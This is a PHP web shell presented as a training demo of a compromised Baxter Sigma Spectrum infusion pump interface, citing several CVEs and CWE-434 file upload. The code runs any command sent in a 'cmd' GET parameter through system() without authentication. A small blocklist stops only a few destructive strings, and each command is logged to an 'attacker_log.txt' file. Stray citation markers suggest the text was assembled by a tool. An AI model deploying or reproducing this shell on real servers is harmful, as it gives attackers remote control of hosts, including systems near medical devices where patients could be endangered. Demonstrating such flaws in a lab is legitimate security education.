<?php
// Malicious payload demonstration for Baxter pump simulation
// WARNING: Educational purposes only!

// Set up display
echo "<!DOCTYPE html><html><head><title>Baxter Pump - Remote Access</title>";
echo "<style>
    body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }
    .container { max-width: 900px; margin: 0 auto; background: #1a1a1a; padding: 20px; border-radius: 5px; border: 1px solid #333; }
    .header { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
    .warning { background: #332200; color: #ffaa00; padding: 10px; border-radius: 3px; margin-bottom: 20px; }
    .output { background: #000; padding: 15px; border-radius: 3px; overflow-x: auto; }
    .cmd-form { margin-bottom: 20px; }
    input[type=text] { width: 70%; padding: 10px; background: #333; border: 1px solid #555; color: #0f0; }
    input[type=submit] { padding: 10px 20px; background: #0a0; border: none; color: #000; cursor: pointer; }
    .device-info { background: #112211; padding: 10px; border-radius: 3px; margin-top: 20px; }
    .vuln-list { background: #221111; padding: 10px; border-radius: 3px; margin-top: 20px; }
</style></head><body>";
echo "<div class='container'>";
echo "<div class='header'>";
echo "<h1>⚡ Baxter Sigma Infusion Pump</h1>";
echo "<h3>Remote Administration Interface (UNAUTHORIZED ACCESS)</h3>";
echo "</div>";

echo "<div class='warning'>";
echo "<strong>⚠️ UNAUTHORIZED ACCESS DETECTED</strong><br>";
echo "This interface simulates how an attacker could exploit CWE-434 to gain remote access to a medical device.<br>";
echo "<em>Based on actual vulnerabilities in Baxter Sigma Spectrum pumps (CVE-2014-5432, CVE-2014-5434) [citation:2][citation:4]</em>";
echo "</div>";

// Device information
echo "<div class='device-info'>";
echo "<h4>📟 Device Information:</h4>";
echo "<ul>";
echo "<li><strong>Model:</strong> Sigma Spectrum Infusion Pump</li>";
echo "<li><strong>Product Code:</strong> 35700BAX</li>";
echo "<li><strong>Software Version:</strong> 6.05 (Vulnerable)</li>";
echo "<li><strong>WBM Version:</strong> 16</li>";
echo "<li><strong>Current Time:</strong> " . date('Y-m-d H:i:s') . "</li>";
echo "<li><strong>Server Software:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</li>";
echo "<li><strong>PHP Version:</strong> " . phpversion() . "</li>";
echo "</ul>";
echo "</div>";

// Command execution form
echo "<div class='cmd-form'>";
echo "<h4>⌨️ Remote Command Execution</h4>";
echo "<form method='GET'>";
echo "<input type='text' name='cmd' placeholder='Enter system command (e.g., dir, ipconfig, whoami)' value='" . htmlspecialchars($_GET['cmd'] ?? '') . "'>";
echo "<input type='submit' value='Execute'>";
echo "</form>";
echo "</div>";

// Execute command if provided
if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "<h4>📤 Command: <code>" . htmlspecialchars($cmd) . "</code></h4>";
    echo "<div class='output'>";
    echo "<pre>";
    
    // Security check - prevent dangerous commands for demo safety
    $dangerous = ['rm -rf', 'format', 'del /f', 'rd /s', 'shutdown'];
    $safe = true;
    foreach ($dangerous as $danger) {
        if (stripos($cmd, $danger) !== false) {
            $safe = false;
            echo "⚠️ Command blocked for safety: $danger\n";
            break;
        }
    }
    
    if ($safe) {
        // Execute the command
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            // Windows
            system($cmd . " 2>&1");
        } else {
            // Linux/Unix
            system($cmd . " 2>&1");
        }
    }
    
    echo "</pre>";
    echo "</div>";
    
    // Log the command (simulate attacker logging)
    $log_entry = date('Y-m-d H:i:s') . " - Command executed: " . $cmd . "\n";
    file_put_contents('attacker_log.txt', $log_entry, FILE_APPEND);
}

// Display vulnerability information
echo "<div class='vuln-list'>";
echo "<h4>🔓 Exploited Vulnerabilities:</h4>";
echo "<ul>";
echo "<li><strong>CWE-434:</strong> Unrestricted File Upload - Allowed uploading this PHP file</li>";
echo "<li><strong>CVE-2014-5432:</strong> Unauthenticated SSH access (simulated) [citation:4]</li>";
echo "<li><strong>CVE-2014-5434:</strong> Hard-coded FTP credentials [citation:2][citation:6]</li>";
echo "<li><strong>CVE-2014-5433:</strong> Cleartext wireless credentials [citation:1]</li>";
echo "<li><strong>CVE-2020-12045:</strong> Telnet with hard-coded credentials [citation:1]</li>";
echo "</ul>";
echo "</div>";

// Navigation
echo "<p><a href='index.php' style='color: #0f0;'>← Return to Device Interface</a></p>";
echo "</div></body></html>";
?>